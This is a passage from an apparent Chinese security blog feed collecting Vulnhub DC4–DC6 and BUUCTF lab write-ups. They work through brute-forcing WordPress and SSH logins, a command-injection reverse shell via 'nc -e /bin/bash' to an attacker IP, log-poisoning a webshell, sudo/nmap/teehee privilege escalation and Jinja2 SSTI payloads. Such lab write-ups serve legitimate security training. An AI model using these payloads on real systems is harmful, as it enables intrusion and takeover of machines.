class="line">//根据网页的内容输出一个字典</span><br><span class="line">cewl https://www.wordy.com/ -w pass.txt</span><br><span class="line"> </span><br><span class="line">//使用命令枚举这个网站的用户</span><br><span class="line">wpscan --url https://www.wordy.com/ -e u  #使用这个没有枚举成功</span><br><span class="line">wpscan --url http://wordy/ -e u  #这个成功了，有点想不明白</span><br><span class="line"> </span><br><span class="line">//将枚举出来的几个用户输入到user.txt</span><br><span class="line">echo &quot;admin\ngraham\nmark\nsarah\njens&quot; &gt; user.txt</span><br><span class="line"> </span><br><span class="line">//尝试爆破密码</span><br><span class="line">wpscan --url wordy -U user.txt -P passwd.txt </span><br></pre></td></tr></table></figure><p><strong>去看别人的wp才知道要使用/usr/share/wordlists/rockyou.txt作为字典，但是这个字典很大，我就将一些关于密码的一些提取到一个字典中，这时候我已经知道密码是helpdesk01了</strong></p><p><strong>注意：rockyou.txt字典是一个压缩包需要我们自己解压。</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;admin\ngraham\nmark\nsarah\njens&quot; &gt; user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//提取相关密码到一个新的字典文件</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep help &gt; passwd.txt</span><br><span class="line"> </span><br><span class="line">//这里重新爆破</span><br><span class="line">wpscan --url wordy -U user.txt -P passwd.txt </span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413103015685.png" alt="image-20230413103015685"></p><p>这里爆破出来了,<a href="http://wordy/wp-login.php">http://wordy/wp-login.php</a> 在这里登录</p><p><code>mark:helpdesk01</code></p><p><img src="../images/image-20230413103149712.png" alt="image-20230413103149712"></p><p>成功登录后台</p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>这里的漏洞执行命令在这里</p><p><img src="../images/image-20230413103421863.png" alt="image-20230413103421863"></p><p><img src="../images/image-20230413103455979.png" alt="image-20230413103455979"></p><p><img src="../images/image-20230413103503477.png" alt="image-20230413103503477"></p><p>成功进行了命令执行</p><p><img src="../images/image-20230413103535699.png" alt="image-20230413103535699"></p><p>发现居然有长度限制，但是这里的长度限制只有前端有，后端没有，于是我们就尝试修改一下前端限制长度</p><p><img src="../images/image-20230413103828270.png" alt="image-20230413103828270"></p><p><strong>我们也可以进行抓包来及进行修改</strong></p><p><img src="../images/image-20230413104209721.png" alt="image-20230413104209721"></p><p>这里没有长度进行限制</p><p>然后我们就尝试反弹shell，拿到这个网站的服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1;nc -e /bin/bash 192.168.142.129 4444</span><br><span class="line"> </span><br><span class="line">//使用python搞一个伪shell</span><br><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413104405636.png" alt="image-20230413104405636"></p><p>弹上去了</p><p>然后进行交互shell</p><p><img src="../images/image-20230413104510719.png" alt="image-20230413104510719"></p><p>然后尝试开始提权</p><p><strong>suid sudo 内核提权</strong>  都试了一遍发现没啥用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">最后在用户的根目录中发现了可以文件夹，/home/mark/stuff中发现一个things-to-do.txt</span><br><span class="line">这里发现了graham用户的密码,然后我们通过su来到graham用户中</span><br><span class="line">graham:GSo7isUM1D4</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230413104651652.png" alt="image-20230413104651652"></p><p><strong>mark用户的话   sudo -l 查看时需要密码的</strong></p><p>在这里发现sudo -l没有需要密码，而且还有东西，这里去看看</p><p><img src="../images/image-20230413105147268.png" alt="image-20230413105147268"></p><p><strong>/<em>bin</em>/<em>bash</em> 是指此脚本使用/<em>bin</em>/<em>bash</em>来解释执行，#!是特殊的表示符，其后面根的是此解释此脚本的shell的路径</strong></p><p>发现个可执行脚本</p><p><img src="../images/image-20230413105734306.png" alt="image-20230413105734306"></p><p>于是添加/bin/bash进去执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//来到提权文件那里</span><br><span class="line">cd /home/jens</span><br><span class="line"> </span><br><span class="line">//添加可以提权的东西</span><br><span class="line">echo &quot;/bin/bash&quot; &gt;&gt; backups.sh</span><br><span class="line"> </span><br><span class="line">//这里原本直接提权到root，但是失败了</span><br><span class="line">sudo -u root ./backups.sh</span><br><span class="line"></span><br><span class="line">//这里选择到jens中</span><br><span class="line">sudo -u jens ./backups.sh</span><br></pre></td></tr></table></figure><p>如果用root用户执行成功的话  那么我们就直接是root用户了</p><p><img src="../images/image-20230413110135091.png" alt="image-20230413110135091"></p><p><img src="../images/image-20230413110241832.png" alt="image-20230413110241832"></p><p>又发现一个无密码能执行的操作    <strong>nmap</strong></p><p>这里查看一些关于nmap的提权方法。</p><p><img src="../images/image-20230413110341092.png" alt="image-20230413110341092"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;os.execute(&quot;/bin/bash&quot;)&#x27;&gt;getroot.sh</span><br><span class="line">sudo nmap --script=getroot.sh</span><br></pre></td></tr></table></figure><p><code>--script=script_name 使用扩展脚本</code></p><p><img src="../images/image-20230413110654526.png" alt="image-20230413110654526"></p><p>提权成功</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;总结:wpscan爆破，&lt;a href=&quot;https://so.csdn.net/so/search?q=nmap&amp;amp;spm=1001.2101.3001.7020&quot;&gt;nmap&lt;/a&gt;提权&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;发现靶机ip&lt;/p&gt;
&lt;p&gt;&lt;</summary>
      
    
    
    
    
    <category term="vulnhub DC6" scheme="https://ke1nys.github.io/tags/vulnhub-DC6/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub-DC5</title>
    <link href="https://ke1nys.github.io/posts/ba2e977e.html"/>
    <id>https://ke1nys.github.io/posts/ba2e977e.html</id>
    <published>2023-04-12T07:26:56.000Z</published>
    <updated>2023-04-12T11:26:24.811Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>总结：screen-4.5.0<a href="https://so.csdn.net/so/search?q=提权&amp;spm=1001.2101.3001.7020">提权</a></p></blockquote><p>先扫一下端口</p><p><img src="../images/image-20230412152813358.png" alt="image-20230412152813358"></p><p>发现了一个<strong>rpcbind</strong>的东西   先去查查这是个什么东西</p><p><img src="../images/image-20230412152939958.png" alt="image-20230412152939958"></p><p>题目这里给了这个端口的服务的话，肯定是会存在漏洞，等会我们可以去查查这个服务的漏洞</p><p><img src="../images/image-20230412153058971.png" alt="image-20230412153058971"></p><p><img src="../images/image-20230412153151894.png" alt="image-20230412153151894"></p><p>除了这里之外没有别的地方可以写东西了，那么我们就尝试一下去扫一下目录</p><p><img src="../images/image-20230412153543069.png" alt="image-20230412153543069"></p><p>扫到一些目录</p><p>只有这个目录是新的 <strong>thankyou.php</strong> </p><p>其他目录就是网站上的目录，那么我们就访问这个目录</p><p><img src="../images/image-20230412153859581.png" alt="image-20230412153859581"></p><p>这里的话有个file参数可进行任意文件的读取</p><p><img src="../images/image-20230412153954317.png" alt="image-20230412153954317"></p><p>确实可以进行任意文件的读取</p><p>这里话由于这个网站是nginx的，那么我们就想一下看能不能进行<strong>日志文件包含</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.5.8/thankyou.php?file=/var/log/nginx/access.log  ##看日志文件</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412154257695.png" alt="image-20230412154257695"></p><p>成功读取，那么我们就尝试一下看能不能写进去一句话木马</p><p><img src="../images/image-20230412160439962.png" alt="image-20230412160439962"></p><p>抓包后，进行写一句话木马</p><p><img src="../images/image-20230412162804378.png" alt="image-20230412162804378"></p><p>这里还有一种写法在这篇文章   就是利用写入不是文件名，然后报错把内容写入<strong>error.log</strong>         <a href="https://blog.csdn.net/rpsate/article/details/119769130?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168128406716800180635192%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168128406716800180635192&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-5-119769130-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=dc5%20vulnhub&amp;spm=1018.2226.3001.4187">error.log方法的文章</a></p><p>ctf题目是在user-Agent处写的，但是这里写不进去，于是就在GET处写</p><p>然后尝试使用蚁剑连接</p><p><img src="../images/image-20230412162817855.png" alt="image-20230412162817855"></p><p>然<img src="../images/image-20230412163233853.png" alt="image-20230412163233853">后就是打开蚁剑终端进行访谈shell了，因为蚁剑终端不好用  提权也提不了</p><p>然后使用<strong>python交互shell</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>到这一步就是开始提权了 </p><p>还是尝试那几种方法  suid  sudo 内核提取</p><p>suid</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412163453606.png" alt="image-20230412163453606"></p><p>发现了有个<strong>screen-4.5.0</strong></p><p>然后就是先利用<strong>searchsploit</strong>工具搜索一下看是否存在漏洞</p><p><img src="../images/image-20230412164801197.png" alt="image-20230412164801197"></p><p>发现确实存在漏洞<strong>(本地提权漏洞)</strong></p><p>然后进行提取文件下来查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41154.sh  41154.sh</span><br><span class="line"> </span><br><span class="line">cp /usr/share/exploitdb/exploits/linux/local/41152.txt  41152.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412173201325.png" alt="image-20230412173201325"></p><p>按照这个里面给的命令和方法照着做就行了</p><p><strong>第一步：将上部分的c语言代码另存为libhax.c文件 然后gcc编译：<code>gcc -fPIC -shared -ldl -o libhax.so libhax.c</code></strong></p><p>这里得把文件都放到tmp文件夹里</p><p><a href="https://blog.csdn.net/m0_64815693/article/details/128687469?spm=1001.2014.3001.5502">wp1 </a>    <a href="https://blog.csdn.net/Aluxian_/article/details/123726473?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522168128406716800180635192%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=168128406716800180635192&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-4-123726473-null-null.142^v82^insert_down1,201^v4^add_ask,239^v2^insert_chatgpt&amp;utm_term=dc5%20vulnhub&amp;spm=1018.2226.3001.4187">wp2</a></p><p>看着跟着搞就行了  这里就不详细写了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;总结：screen-4.5.0&lt;a href=&quot;https://so.csdn.net/so/search?q=提权&amp;amp;spm=1001.2101.3001.7020&quot;&gt;提权&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;先扫一下端口&lt;/</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>vulnhub-DC4</title>
    <link href="https://ke1nys.github.io/posts/cd29a7e8.html"/>
    <id>https://ke1nys.github.io/posts/cd29a7e8.html</id>
    <published>2023-04-11T15:42:10.000Z</published>
    <updated>2023-04-12T07:20:20.483Z</updated>
    
    <content type="html"><![CDATA[<p><strong>总结</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">爆破，teehee提权</span><br></pre></td></tr></table></figure><p>还是先扫一下端口</p><p><img src="../images/image-20230411234310796.png" alt="image-20230411234310796"></p><p>发现两个端口</p><p>一个ssh端口  一个80端口</p><p><img src="../images/image-20230411234348802.png" alt="image-20230411234348802"></p><p>发现就是个简单的登录，没有框架的</p><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p>这里发现有一个登录的网页，这里首先我们尝试尝试一些普通的弱口令，这里没有成功，我们这里使用burp来爆破admin密码。</p><p><img src="../images/image-20230412090343198.png" alt="image-20230412090343198"></p><p>爆破出这个弱密码</p><p><strong>happy</strong></p><p>于是就尝试进行登录</p><p><img src="../images/image-20230412090502638.png" alt="image-20230412090502638"></p><p>成功登录后</p><p><img src="../images/image-20230412090542056.png" alt="image-20230412090542056"></p><p>发现可以进行任意命令的执行</p><p>于是就想的是进行反弹shell</p><p><img src="../images/image-20230412090950140.png" alt="image-20230412090950140"></p><p>反弹shell成功后</p><p>这里的界面太难看，进行<strong>python交互shell</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">&quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412091124299.png" alt="image-20230412091124299"></p><p>进行home目录，发现有三个用户</p><p>进入jim目录，发现有密码备份，于是<strong>猜测可以利用这个密码备份来进行爆破jim的ssh密码</strong></p><p><img src="../images/image-20230412091220929.png" alt="image-20230412091220929"></p><p><img src="../images/image-20230412091518236.png" alt="image-20230412091518236"></p><p><strong>只有短短的一些密码</strong>    存到kali上，等会进行爆破</p><p>于是使用ssh爆破工具开始进行爆破</p><p><a href="https://xie.infoq.cn/article/e82e7a36d35ad78783ef4a1b6">【Kali】中密码暴力破解工具 hydra 的使用</a></p><p><strong>ftp ssh teamspeak  pop3</strong>  都可以进行爆破</p><p>上面的文章里还搭配着一个字典生成工具</p><p><strong>crunch</strong>    但是只能生成纯数字的密码</p><p>使用<strong>hydra -h</strong>慢慢看就行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l jim -P 2.txt ssh://192.168.142.131</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412145145617.png" alt="image-20230412145145617"></p><p>获得密码为：<code>jibril04</code> 登入ssh</p><p><img src="../images/image-20230412145239375.png" alt="image-20230412145239375"></p><p>登录成功</p><p><img src="../images/image-20230412145302805.png" alt="image-20230412145302805"></p><p>获得提示</p><p>登入提示：<code>You have mail</code> 让我们看邮寄 <code>cd/var/mail</code> 发现了jim里面有个Charles密码：<code>^xHhA&amp;hvim0y</code> 尝试切换登入</p><p><img src="../images/image-20230412145604425.png" alt="image-20230412145604425"></p><p>到最后一步了</p><h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>还是先尝试一下suid和sudo 内核提权</p><p><img src="../images/image-20230412145805562.png" alt="image-20230412145805562"></p><p>发现个没密码的能以root权限执行的命令</p><p><img src="../images/image-20230412150005731.png" alt="image-20230412150005731"></p><p><strong>passwd的格式：[⽤户名]：[密码]：[UID]：[GID]：[⾝份描述]：[主⽬录]：[登录shell]</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;axb::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br></pre></td></tr></table></figure><p><strong>uid为零    ——&gt;   root用户</strong></p><p><img src="../images/image-20230412151531467.png" alt="image-20230412151531467"></p><p>这里有个小坑就是切换成charles用户的时候，不能用ssh登录来进行切换，得用之登录的jim用户，使用su切换   不然提权不成功</p><p><strong>方法二</strong></p><p><strong>2.创建定时任务给提权</strong><br>看了一下大佬的博客，发现是这样的，创建一个定时人物然后给/bin/sh赋予SUID的权限，然后用teehee命令这个定时任务，写到/etc/crontab里面去。</p><p>命令如下。</p><p>echo “<em> </em> <em> </em> * root chmod 4777 /bin/sh” | sudo teehee -a /etc/crontab<br>1<br>crontab命令详解可以百度查资料。</p><p>这样之后我们就可以直接在控制台里面输入/bin/sh就可以了，如下图提权成功。</p><p><img src="../images/image-20230412151903053.png" alt="image-20230412151903053"></p><p><strong>总结</strong></p><p>还有弱口令密码爆破</p><p>学习了hydra的使用和teehee提权</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;总结&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;</summary>
      
    
    
    
    
    <category term="vulnhub DC4" scheme="https://ke1nys.github.io/tags/vulnhub-DC4/"/>
    
  </entry>
  
  <entry>
    <title>无敌RCE-trick</title>
    <link href="https://ke1nys.github.io/posts/d13cd9bb.html"/>
    <id>https://ke1nys.github.io/posts/d13cd9bb.html</id>
    <published>2023-04-11T13:23:30.000Z</published>
    <updated>2023-04-11T13:24:01.276Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/q20010619/article/details/109206728">CTF中字符长度限制下的命令执行 rce(7字符5字符4字符)汇总</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/q20010619/article/details/109206728&quot;&gt;CTF中字符长度限制下的命令执行 rce(7字符5字符4字符)汇总&lt;/a&gt;&lt;/p&gt;
</summary>
      
    
    
    
    
    <category term="RCE 限制长度" scheme="https://ke1nys.github.io/tags/RCE-%E9%99%90%E5%88%B6%E9%95%BF%E5%BA%A6/"/>
    
  </entry>
  
  <entry>
    <title>buuctf-刷题记录-第三页</title>
    <link href="https://ke1nys.github.io/posts/dca6c0ad.html"/>
    <id>https://ke1nys.github.io/posts/dca6c0ad.html</id>
    <published>2023-04-11T11:52:28.000Z</published>
    <updated>2023-04-13T13:42:19.531Z</updated>
    
    <content type="html"><![CDATA[<h2 id="GYCTF2020-FlaskApp"><a href="#GYCTF2020-FlaskApp" class="headerlink" title="[GYCTF2020]FlaskApp"></a>[GYCTF2020]FlaskApp</h2><p>题目</p><p><img src="../images/image-20230411195501929.png" alt="image-20230411195501929"></p><p><img src="../images/image-20230411195551367.png" alt="image-20230411195551367"></p><p>提示了，flask算pin</p><p><img src="../images/image-20230411195641629.png" alt="image-20230411195641629"></p><p>利用解密的时候报错，得出一些信息</p><p><img src="../images/image-20230411195756528.png" alt="image-20230411195756528"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/decode&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>,<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>():</span><br><span class="line">    <span class="keyword">if</span> request.values.get(<span class="string">&#x27;text&#x27;</span>) :</span><br><span class="line">        text = request.values.get(<span class="string">&quot;text&quot;</span>)</span><br><span class="line">        text_decode = base64.b64decode(text.encode())</span><br><span class="line">        tmp = <span class="string">&quot;结果 ： &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(text_decode.decode())</span><br><span class="line">        <span class="keyword">if</span> waf(tmp) :</span><br><span class="line">            flash(<span class="string">&quot;no no no !!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;decode&#x27;</span>))</span><br><span class="line">        res =  render_template_string(tmp)</span><br></pre></td></tr></table></figure><ol><li><p>根据代码，可以知道我们加密后的代码经过waf后就会被直接渲染，那么就可能存在ssti了。</p></li><li><p>我们进行绕过来尽可能的达到命令执行，因为有waf，我们对可能进行了过滤的单词使用<strong>拆分关键词进行绕过</strong></p><p><strong>就是输入base64加密后的值，然后进行解密，解密后绕过能绕过waf，那么就可以进行模板注入了</strong></p></li></ol><p><strong>payload</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">&#x27;catch_warnings&#x27;</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b <span class="keyword">in</span> c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% <span class="keyword">if</span> b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">&#x27;eva&#x27;</span>+<span class="string">&#x27;l&#x27;</span> <span class="keyword">in</span> b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">&#x27;eva&#x27;</span>+<span class="string">&#x27;l&#x27;</span>](<span class="string">&#x27;__impor&#x27;</span>+<span class="string">&#x27;t__&#x27;</span>+<span class="string">&#x27;(&quot;o&#x27;</span>+<span class="string">&#x27;s&quot;)&#x27;</span>+<span class="string">&#x27;.pope&#x27;</span>+<span class="string">&#x27;n&#x27;</span>+<span class="string">&#x27;(&quot;cat /this_is_the_flag.txt&quot;).read()&#x27;</span>) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411200146505.png" alt="image-20230411200146505"></p><p>解密后发现flag位置</p><p>直接cat的话会不给读</p><p><img src="../images/image-20230411200248871.png" alt="image-20230411200248871"></p><p>然后尝试一下新的方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/this_is_the_fl&#x27;</span>+<span class="string">&#x27;ag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230411200430933.png" alt="image-20230411200430933"></p><p><strong>这道题有两个解</strong></p><p><a href="https://blog.csdn.net/weixin_44214568/article/details/124125565">第一种解，不需要算pin，这是一种新的ssti读取文件的方法(可以当作积累)</a></p><p><a href="https://mayi077.gitee.io/2020/04/17/GYCTF2020-FlaskApp/">第二种解，flask算pin，之前做的题有写过</a></p><p><img src="../images/image-20230411200822462.png" alt="image-20230411200822462"></p><p><strong>这样也能调出来，之前学到的积累</strong></p><h2 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h2><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure><p>就是简单的无数字字母rce  加  限制长度</p><p><a href="https://www.cnblogs.com/Dreamerwd/p/15421284.html">这篇文章讲了就是assert()函数的使用和如何绕过disable_function进行命令执行</a></p><p><strong>通过环境变量LD_PRELOAD+mail劫持so来执行系统命令</strong>     就是利用这个来进行绕过</p><p>当然蚁剑也有这个功能  就是绕过<strong>disable_function</strong>   来进行命令执行</p><p><strong>就是使用蚁剑的这个功能来进行绕过</strong></p><p><img src="../images/image-20230411214728985.png" alt="image-20230411214728985"></p><h2 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h2><p>题目</p><p><img src="../images/image-20230412195450258.png" alt="image-20230412195450258"></p><p>网页源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">//1st</span></span><br><span class="line"><span class="variable">$query</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span>( <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;_&#x27;</span>) !== <span class="number">0</span> || <span class="title function_ invoke__">substr_count</span>(<span class="variable">$query</span>, <span class="string">&#x27;%5f&#x27;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Y0u are So cutE!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> <span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>] !== <span class="string">&#x27;23333&#x27;</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^23333$/&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;b_u_p_t&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;you are going to the next ~&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>第一个if考察<code>$_SERVER[&#39;QUERY_STRING&#39;]</code>获取的是未经url解码的查询字符串，因此将<code>_</code>url编码后可绕过。（url编码大小写不敏感）</p><p>第二个if考察<code>preg_match()</code>只能匹配单行字符串，会将换行符后的字符串忽略。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?b%5Fu%5Fp%5Ft=23333%0a</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230412200039405.png" alt="image-20230412200039405"></p><p> <strong>secrettw.php</strong></p><p><img src="../images/image-20230412200134805.png" alt="image-20230412200134805"></p><p><img src="../images/image-20230412200153748.png" alt="image-20230412200153748"></p><p>源码给这些东西</p><p>控制台执行输出结果  说是<strong>post一个Merak</strong></p><p><img src="../images/image-20230412200248976.png" alt="image-20230412200248976"></p><p>这是jsfuck编码</p><p><img src="../images/image-20230412200445109.png" alt="image-20230412200445109"></p><p>给了源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 